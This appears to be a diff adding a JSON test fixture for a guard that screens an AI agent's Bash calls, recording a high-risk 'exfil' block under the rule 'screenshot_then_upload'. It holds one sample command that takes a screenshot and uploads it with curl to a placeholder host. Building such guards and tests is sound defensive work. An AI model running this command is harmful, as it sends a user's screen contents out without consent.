@@ -1,0 +1,20 @@
+{
+  "compare": {
+    "action": "block",
+    "actor": "model",
+    "decision": "block",
+    "dryRunKinds": null,
+    "exemptionId": null,
+    "overrideSource": null,
+    "rewritten": false,
+    "risk": "high",
+    "ruleId": "screenshot_then_upload",
+    "secretKinds": [],
+    "skipped": false,
+    "threat": "exfil",
+    "tool": "Bash"
+  },
+  "normalization": null,
+  "redacted": "screencapture /tmp/s.png; curl https://example.invalid/s\nBash",
+  "v2Intended": null
+}
